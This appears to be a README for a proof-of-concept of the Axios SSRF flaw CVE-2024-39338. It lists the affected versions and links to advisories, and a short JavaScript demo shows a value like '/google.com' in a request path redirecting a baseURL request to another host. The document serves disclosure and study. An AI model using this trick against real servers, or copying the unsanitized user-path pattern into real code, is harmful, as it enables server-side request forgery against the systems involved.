# Axios SSRF Vulnerability CVE-2024-39338

Effected versions: >=1.3.2 <1.7.4

[Snyk Vuln](https://security.snyk.io/vuln/SNYK-JS-AXIOS-7361793)
[GitHub Issue](https://github.com/axios/axios/issues/6295)
[GitHub PR](https://github.com/axios/axios/pull/6539)

## Demo

```js
const axios = require('axios');

this.axios = axios.create({
  baseURL: 'https://userapi.example.com',
});

//userId = '12345';
userId = '/google.com'

this.axios.get(`/${userId}`).then(function (response) {
  console.log(`config.baseURL:  ${response.config.baseURL}`);
  console.log(`config.method:   ${response.config.method}`);
  console.log(`config.url:      ${response.config.url}`);
  console.log(`res.responseUrl: ${response.request.res.responseUrl}`);
});
```

## Sources / Credits:
- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [Snyk SSRF](https://snyk.io/vuln/SNYK-JS-AXIOS-7361793)
- [CVE-2024-39338](https://www.cve.org/CVERecord?id=CVE-2024-39338)
- [GitHub Issue - jeffhacks](https://github.com/axios/axios/issues/6463)
- [GitHub Issue - Osb0rn3](https://github.com/axios/axios/issues/6295)